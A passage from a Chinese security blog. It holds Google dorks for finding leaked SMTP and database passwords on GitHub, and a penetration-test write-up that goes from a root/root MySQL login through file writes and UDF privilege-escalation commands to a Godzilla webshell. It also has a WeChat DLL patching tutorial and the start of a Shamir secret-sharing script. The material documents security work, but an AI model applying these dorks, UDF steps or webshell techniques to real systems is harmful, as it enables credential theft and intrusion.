学号</span><br></code></pre></td></tr></table></figure><p>通过用户的一些信息（Mail、Name、ID、Tel）查询用户注册过哪些应用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.reg007.com/<br></code></pre></td></tr></table></figure><h2 id="Github信息泄漏"><a href="#Github信息泄漏" class="headerlink" title="Github信息泄漏"></a>Github信息泄漏</h2><p>很多网站及系统都会使用pop3和smtp发送来邮件，不少开发者由于安全意识不足会把相关的配置文件信息也放到Github上，所以如果这时候我们动用一下Google搜索语法，就能把这些敏感信息给找出来了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">site:Github<span class="hljs-selector-class">.com</span> smtp<br>site:Github<span class="hljs-selector-class">.com</span> smtp @qq<span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">126</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">163</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @sina<span class="hljs-selector-class">.com</span>.cn<br></code></pre></td></tr></table></figure><p>数据库信息泄露：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:Github.<span class="hljs-keyword">com</span> <span class="hljs-keyword">sa</span> password<br>site:Github.<span class="hljs-keyword">com</span> root password<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Information</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从 MySQL 弱口令到哥斯拉上线</title>
    <link href="/2023/04/12/mysql_weakpass_getshell/"/>
    <url>/2023/04/12/mysql_weakpass_getshell/</url>
    
    <content type="html"><![CDATA[<h1 id="从-MySQL-弱口令到哥斯拉上线"><a href="#从-MySQL-弱口令到哥斯拉上线" class="headerlink" title="从 MySQL 弱口令到哥斯拉上线"></a>从 MySQL 弱口令到哥斯拉上线</h1><p>给一个客户系统做渗透，记录下过程</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>没有测试账号，本来没抱希望，打算找几个水洞，找不到洞，尝试扫个端口发现 3306 是开放的</p><p><img src="https://img.tucang.cc/api/image/show/e0991aa643bf2946fca602c3f8f057b3" alt="image-20230412182240949"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>习惯性尝试使用 <code>root/root</code> 连接数据库，连接成功</p><p><img src="https://img.tucang.cc/api/image/show/41f2ad6ad45f2686bb0d917f591ccbb1" alt="image-20230412182344175"></p><h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p>数据库查询到用户信息，密码为md5存储</p><p><img src="https://img.tucang.cc/api/image/show/32bf4c2082bca9fa088c85815577c0f7" alt="image-20230412182914040"></p><p>查询得到账号信息：</p><p><img src="https://img.tucang.cc/api/image/show/3da435c12edd4182def638a85191d69b" alt="image-20230412182837718"></p><p>登陆成功，共两个管理员账号</p><p><img src="https://img.tucang.cc/api/image/show/3072f49bcb28f10ce3ef618a8f6bc6d7" alt="image-20230412182938172"></p><h2 id="尝试写🐎"><a href="#尝试写🐎" class="headerlink" title="尝试写🐎"></a>尝试写🐎</h2><p>在web应用没有找到上传点，尝试数据库写🐎试试</p><p>写文件的前提：</p><ol><li>知道网站物理路径</li><li>高权限数据库用户</li><li><code>load_file()</code> 开启 即 <code>secure_file_priv</code> 无限制</li><li>网站路径有写入权限</li></ol><p>查看<code>secure_file_priv</code> 为空</p><p><img src="https://img.tucang.cc/api/image/show/89f7d72b1ac549026f724587fe3ca9af" alt="image-20230412145715965"></p><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>&#x2F;tmp</td><td>只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select &#x27;hello&#x27; into outfile &#x27;xxxxx/123.txt&#x27;;<br></code></pre></td></tr></table></figure><p>文件可以写入，并且可以读出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;xxxxxx/123.txt&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/aa1fec1a257db5b2a32c3f28c2cc7830" alt="image-20230412183651820"></p><p>但找遍了数据库也没找到有出现 web 应用路径的地方</p><h2 id="尝试UDF提权"><a href="#尝试UDF提权" class="headerlink" title="尝试UDF提权"></a>尝试UDF提权</h2><h3 id="MUDT"><a href="#MUDT" class="headerlink" title="MUDT"></a>MUDT</h3><p>我们是直接连的数据库，没有注入点，因此无法用sqlmap进行提权，先尝试一波 MDUT 工具，看看能不能提权</p><p><img src="https://img.tucang.cc/api/image/show/d913118d5612b7a471f3ab611d8e3a8e" alt="image-20230412182635522"></p><p>但创建函数失败</p><p><img src="https://img.tucang.cc/api/image/show/6fbdc3357007d6c20aea8c3854014db1" alt="WeChatWorkScreenshot_e83eb0cc-441d-4cd9-817f-9ec641eb6cb3"></p><h3 id="手动尝试一次"><a href="#手动尝试一次" class="headerlink" title="手动尝试一次"></a>手动尝试一次</h3><h4 id="plugin-文件夹"><a href="#plugin-文件夹" class="headerlink" title="plugin 文件夹"></a>plugin 文件夹</h4><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><p>已经存在 <code>plugin</code> 文件夹了</p><p><img src="https://img.tucang.cc/api/image/show/75bd932cb82b2bfbac582baffb87ecfd" alt="image-20230412183354599"></p><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; <span class="hljs-keyword">select</span> 123 into dumpfile <span class="hljs-string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="传入动态链接库文件"><a href="#传入动态链接库文件" class="headerlink" title="传入动态链接库文件"></a>传入动态链接库文件</h4><p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p><ul><li><strong>sqlmap 的 UDF 动态链接库文件位置</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><p>白嫖个图：</p><p><img src="https://img.tucang.cc/api/image/show/54a2e1db3edfe8c4e88304d2dcdb02ce" alt="img"></p><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：（白嫖个方法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录情况</span><br>➜ <span class="hljs-built_in">pwd</span><br>/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak<br><br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br><br><span class="hljs-comment"># 查看当前目录下的情况</span><br>➜ <span class="hljs-built_in">ls</span><br>README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so<br>__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p>这个博主打包了 sqlmap 解码后的动态链接库：<a href="https://sqlsec.lanzoux.com/i4b7jhyhwid">蓝奏云 - sqlmap udf.zip</a> 需要的朋友可以自提</p><ul><li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF 根目录/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f883960dbe9c01981811403e5f04e35b" alt="img"></p><p>Metasploit 自带的动态链接库文件无需解码，开箱即可食用。</p><p>使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。</p><p>下面来看下动态链接库里面有包含了哪些函数：</p><p><img src="https://img.tucang.cc/api/image/show/34d3e091b7bcf3ada67ce6eaa1c555bf" alt="img"></p><p>如果有注入点的话可以尝试用 SQLMAP，这里没有，接着手动</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 直接 <span class="hljs-keyword">SELECT</span> 查询十六进制写入<br><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;xxxxx/plugin/udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这里有十六进制的语句，将路径改成实际路径即可 <a href="https://www.sqlsec.com/udf/">UDF十六进制</a></p><h4 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>这里依旧报错</p><p><img src="https://img.tucang.cc/api/image/show/ce64b702b3dcb17afd38ee1858b6e3ee" alt="image-20230412184927566"></p><blockquote><p>1123 - Can’t initialize function ‘sys_eval’; UDFs are unavailable with the –skip-grant-tables option</p></blockquote><p>需要将 <code>my.ini</code> 中的 <code>skip-grant-tables</code> 选项去掉</p><p>读 <code>xxxxx/my.ini</code> 也看到确实存在，但这里没法操作，只好作罢</p><p><img src="https://img.tucang.cc/api/image/show/999a058084b7703576f84f514965b2eb" alt="image-20230412184947048"></p><h2 id="Druid-未授权"><a href="#Druid-未授权" class="headerlink" title="Druid 未授权"></a>Druid 未授权</h2><p>就当要放弃的时候，发现了一个 <code>Druid 未授权</code>，可谓是救命稻草，现在就缺一个路径，真是送到嘴边了</p><p><img src="https://img.tucang.cc/api/image/show/ea6f3f684a4731f6a6bf0e211ba348c2" alt="image-20230412185141640"></p><h2 id="默认页面未删除"><a href="#默认页面未删除" class="headerlink" title="默认页面未删除"></a>默认页面未删除</h2><p>同时 <code>dirsearch</code> 收集信息的时候，也发现了默认页面：</p><p><img src="https://img.tucang.cc/api/image/show/4fd06fe2e31f93d9e0e7aea1ecc461d5" alt="image-20230412185238598"></p><p>真的是非常贴心了</p><p><img src="https://img.tucang.cc/api/image/show/b89b1a5cc347484ee605b72a91287c2d" alt="image-20230412185327670"></p><p>怕我看不懂，还给我解释了：</p><blockquote><p>where “$CATALINA_HOME” is the root of the Tomcat installation directory.</p></blockquote><h2 id="继续写🐎"><a href="#继续写🐎" class="headerlink" title="继续写🐎"></a>继续写🐎</h2><p>直接用路径拼接，传一个 hello 上去</p><p><img src="https://img.tucang.cc/api/image/show/dd7ba1ab43d6b56019cee457093b33cf" alt="image-20230412185733751"></p><p>成功 hello</p><p><img src="https://img.tucang.cc/api/image/show/80ae4e9ffd0fdd099124d29d0baf80b3" alt="image-20230412185813134"></p><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><p>直接上马（这里一直在调试，从 <code>1.jsp</code> 迭代到 <code>6.jsp</code> 了）</p><p><img src="https://img.tucang.cc/api/image/show/59635ab512f922d0f7ce00504567bb2a" alt="image-20230412185858078"></p><p>哥斯拉上线</p><p><img src="https://img.tucang.cc/api/image/show/94f7dbfb2715705e3a8e2f5eebf70e61" alt="image-20230412190111914"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55b63ead9084d03ab1510957ec423724" alt="image-20230412190139502"></p><h2 id="x2F-manager-x2F-html"><a href="#x2F-manager-x2F-html" class="headerlink" title="&#x2F;manager&#x2F;html"></a>&#x2F;manager&#x2F;html</h2><p>另外也找到 <code>xxxx:8080/manager/html</code> 了，拿 <code>msf</code> 进行了一次常规默认密码爆破，并没有爆出</p><p>后来拿到物理路径也刚好读一下<code>xxxxx/conf/tomcat-users.xml</code></p><p><img src="https://img.tucang.cc/api/image/show/76e43b161928a96474abb162bda578de" alt="image-20230412185534061"></p><p>但密码还是不正确，这个点没法用</p><p><img src="https://img.tucang.cc/api/image/show/828e847b3da51385fc9f40eefcb79e64" alt="image-20230412190750048"></p><p>因为本身就是测的内网系统，就不做内网渗透了（不是因为不会</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PC 端微信防撤回与多开 Patch</title>
    <link href="/2022/12/22/Wechat_revoke/"/>
    <url>/2022/12/22/Wechat_revoke/</url>
    
    <content type="html"><![CDATA[<h1 id="PC-端微信防撤回与多开-Patch"><a href="#PC-端微信防撤回与多开-Patch" class="headerlink" title="PC 端微信防撤回与多开 Patch"></a>PC 端微信防撤回与多开 Patch</h1><p>这是一个成果向教程，参考了一些网上的教程汇总而成。仅用于技术交流。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>撤回的英文 “recall”、”revoke”；多开猜测用了 <code>mutex</code></li><li>用 <code>notepad++</code> 对所有文件进行搜索</li><li>对结果分析，定位到关键逻辑位于 <code>WeChatWin.dll</code> 文件中</li><li>附加到进程</li><li>选择对应模块</li><li>搜索关键字 “revoke”</li><li>下断点</li><li>调试</li><li>记录特征值(方便下次修改)</li></ol><p>通过网上各位大牛的研究，我们已经知道一下信息：</p><ul><li>撤回、限制多开的逻辑都位于 <code>WeChatWin.dll</code> 文件中</li><li>撤回相关的关键词 <code>revokemsg</code></li><li>多开相关的关键词 <code>WeChat_App_Instance_Identity_Mutex_Name</code></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://down.52pojie.cn/Tools/Debuggers/x64dbg_2019_07_02.zip">x32dbg</a></li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>登录微信，这里登小号测试</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/20997/30/20053/21701/63b1abb5F918b46d4/88547752797801d6.png" alt="image-20221222151758533" style="zoom:50%;" /><p>打开 <code>x32dbg</code>，将微信进程附加进去</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/169006/39/33577/77381/63b1ac31F8f79d85f/a535c0fb43fef10b.png" alt="image-20221222151830104" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/61127/36/23533/150329/63b1ac3bFe5b04626/d5c81636f991eb9d.png" alt="image-20221222151849988" style="zoom:50%;" /><p>微信进程已经附加，微信会进入假死状态，点不动是正常的</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/67287/24/23472/798125/63b1ac56F6f51a3e2/2b5715b683543377.png" alt="image-20221222152029216" style="zoom:50%;" /><p>切换到符号选项卡，在左下角搜索 <code>WeChatWin.dll</code> ，双击 <code>wechatwin.dll</code> 进入 CPU 选项卡</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163432/30/33588/560091/63b1ac69F207c8f60/1547ee425e1b47a8.png" alt="image-20221222152103370" style="zoom:50%;" /><p>进入后右键 <code>搜索 -&gt; 当前区域 -&gt; 字符串</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/125146/22/34140/401028/63b1ac79Fe2eb1674/6e8a58580f904f52.png" alt="image-20221222152156692" style="zoom:50%;" /><h3 id="防撤回"><a href="#防撤回" class="headerlink" title="防撤回"></a>防撤回</h3><p>直接搜索关键词 <code>revokemsg</code>，然后双击<strong>第一个</strong><code>&quot;revokemsg&quot;</code>进入 (站在了巨人的肩膀上)</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/30539/22/19502/614117/63b1ac87Fdefcc75b/0ef097a18e6547ff.png" alt="image-20221222153829360" style="zoom:50%;" /><p>进入可以看到如下，该指令上一条是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6EA62DEB</span> | <span class="hljs-number">74</span> <span class="hljs-number">32</span>                    | je wechatwin.<span class="hljs-number">6</span>EA62E1F                   |<br></code></pre></td></tr></table></figure><p><code>je wechatwin.6EA62E1F</code>，<code>je</code> 是 <code>jump if equal</code>，这条指令以下的框框(即 <code>0x6ea62deb</code> 地址到 <code>0x6ea62e1f</code> 地址间的指令)为撤回的逻辑。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129759/12/32342/182416/63b1ac90Fc8ff35e9/69c5e67ff2a80e76.png" alt="image-20221222153905922" style="zoom:50%;" /><p>跳过该逻辑，将 <code>je</code> 改成 <code>jmp</code>，直接跳过；也可将 <code>call</code> 删掉或用 <code>nop</code> 填充</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/43380/37/21957/165902/63b1aca4Fc3feaac2/e15e27374e22e182.png" alt="image-20221222154837170" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98659/25/32555/175309/63b1acadFae311236/35d973c7f0b9948b.png" alt="image-20221222154904367" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32783/28/19590/197210/63b1acc8F2e80011f/d51dfebab97d78a9.png" alt="image-20221222154932229" style="zoom:50%;" /><p>到这撤回功能就被我们跳过了</p><h3 id="多开"><a href="#多开" class="headerlink" title="多开"></a>多开</h3><p>搜索关键词 <code>WeChat_App_Instance_Identity_Mutex_Name</code>，然后双击<strong>第一个</strong><code>L&quot;WeChat_App_Instance_Identity_Mutex_Name&quot;</code>进入</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/87351/13/31426/72016/63b1acd1Fd292e584/80c75f242561ed4b.png" alt="image-20221222155142916" style="zoom:50%;" /><p>需要进行修改的是当前行的上面第一个出现的 <code>push ebp</code>，为该程序的入口，启动的时候进行唯一性检查</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186661/35/32135/175696/63b1ace7Fdc084b16/4c4639e687b6a65f.png" alt="image-20221222155226614" style="zoom:50%;" /><p>将 <code>push ebp</code> 修改为 <code>ret</code> 即可，即把检查只开一个微信的功能直接 <code>return</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/43386/7/19316/157205/63b1ad03F717fdb9d/12142b24907db446.png" alt="image-20221222155427272" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143019/38/32463/142683/63b1ad15Fd4fde8bb/0484a1b8818e5b6a.png" alt="image-20221222155445694" style="zoom:50%;" /><p>到这防多开也做好了</p><h2 id="打-Patch"><a href="#打-Patch" class="headerlink" title="打 Patch"></a>打 Patch</h2><p>点击生成补丁的按钮，然后点击修补文件就可以得到修改后的 <code>WeChatWin.dll</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/213488/3/24586/180839/63b1ad33Fc60bcfdb/df2ee240fb6126ca.png" alt="image-20221222155814551" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/73029/22/24772/220668/63b1ad3bF884b3266/f8d8650424b2edab.png" alt="image-20221222160007408" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/14998/1/19080/47538/63b1ad48F9f350930/38aed109e102907f.png" alt="image-20221222160039615" style="zoom:50%;" /><p>最后将原 <code>WeChatWin.dll</code> 备份一下，再将打过 Patch 的文件替换为原本的文件，就可以实现功能了</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143461/32/33281/207161/63b1ad4fF4776f3af/901729c47bb01679.png" alt="image-20221222160136879" style="zoom:50%;" /><p>最后看看功能：</p><p><strong>防撤回：</strong></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/212791/29/24712/20193/63b1ad54Fa587792d/bac827f64aa4c199.png" alt="image-20221222160257871" style="zoom:50%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/114510/37/33281/10100/63b1ad5bFd022f0c5/68f884159212340d.png" alt="image-20221222160326874" style="zoom:50%;" /><p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/131527/21/32549/36806/63b1afffF07973afe/82d58302a4e4b791.png" alt="image-20230102000819774"></p><p><strong>多开：</strong></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/11290/5/20866/32757/63b1aef0Fda7788ab/8afdbaa0590643b7.png" alt="image-20221222160744866" style="zoom:50%;" /><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.52pojie.cn/thread-901652-1-1.html">https://www.52pojie.cn/thread-901652-1-1.html</a></li><li><a href="https://www.v2ex.com/t/525542">https://www.v2ex.com/t/525542</a></li><li><a href="https://github.com/Sev73n/wechat_win_revokemsg_block">https://github.com/Sev73n/wechat_win_revokemsg_block</a></li><li><a href="https://github.com/huiyadanli/RevokeMsgPatcher/wiki/">https://github.com/huiyadanli/RevokeMsgPatcher/wiki/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shamir (k, n)门限秘密分发</title>
    <link href="/2020/09/21/Shamir/"/>
    <url>/2020/09/21/Shamir/</url>
    
    <content type="html"><![CDATA[<p>秘密分发我分为了两个模块，一个是分发，一个是恢复。</p><h3 id="秘密分发"><a href="#秘密分发" class="headerlink" title="秘密分发"></a>秘密分发</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">环境：Windows 10，Python 3.7.1<br></code></pre></td></tr></table></figure><p>因为k，n都是整数，因此输入的时候进行一下强制类型转换，对于需要分发的秘密，示例是整数，但有可能是字符串，因此利用 <code>libnum.s2n</code> 将字符串转换成整数，再进行运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">D = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input your secret: &quot;</span>)<br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;How many parts do you want to devide: &quot;</span>))<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Subset: &quot;</span>))<br></code></pre></td></tr></table></figure><p>对于素数 p 的获取，我使用了 <code>Crypto.Util.number</code> 模块中 <code>getPrime</code> 函数，它的参数取决于 D 和 n 的字节长度，在p不会太过大的情况同时，保证 D、n&lt;p，并在后面判断若p&lt;D或n，重新取值，然后用随机数生成对多项式的系数进行赋值，放进一个列表里，然后公开 p 和 k。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printnum</span>(<span class="hljs-params">num</span>): <span class="hljs-comment"># 打印多项式，便于自己查看</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(num[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(num)):<br><span class="hljs-keyword">if</span>(i == <span class="hljs-number">1</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+&#x27;</span> + <span class="hljs-built_in">str</span>(num[i]) + <span class="hljs-string">&quot;x&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+&#x27;</span> + <span class="hljs-built_in">str</span>(num[i]) + <span class="hljs-string">&quot;x^&quot;</span> + <span class="hljs-built_in">str</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>()<br><br><br>D = libnum.s2n(D)<br>bit_D = math.log(D, <span class="hljs-number">2</span>)<br>bit_n = math.log(n, <span class="hljs-number">2</span>)<br>bit = <span class="hljs-built_in">max</span>(bit_D, bit_n)<br>p = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">2</span>)<br><span class="hljs-keyword">while</span> p &lt; D <span class="hljs-keyword">or</span> p &lt; n:<br>p = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">2</span>)<br><br>num = [D]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k-<span class="hljs-number">1</span>):<br>num.append(random.randint(<span class="hljs-number">1</span>, p))<br><br>printnum(num)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your Prime:&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Subset:&quot;</span>, k)<br></code></pre></td></tr></table></figure><p>然后求出所有的 <code>Di</code>，将它的 <code>i</code> 和 <code>Di</code> 以 <code>(x, y)</code> 的形式打包存储进一个列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">num, x, p</span>): <span class="hljs-comment"># 计算每个i多项式方程的值</span><br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(num)):<br>result += num[i]*(x**i)<br><span class="hljs-keyword">return</span> (x, result % p)<br><br><br>_D = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n+<span class="hljs-number">1</span>):<br>tmp = f(num, i, p)<br>_D.append(tmp)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;D&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(tmp))<br></code></pre></td></tr></table></figure><p>将每一个 <code>Di</code> 输出，由秘密输入者进行分发 n 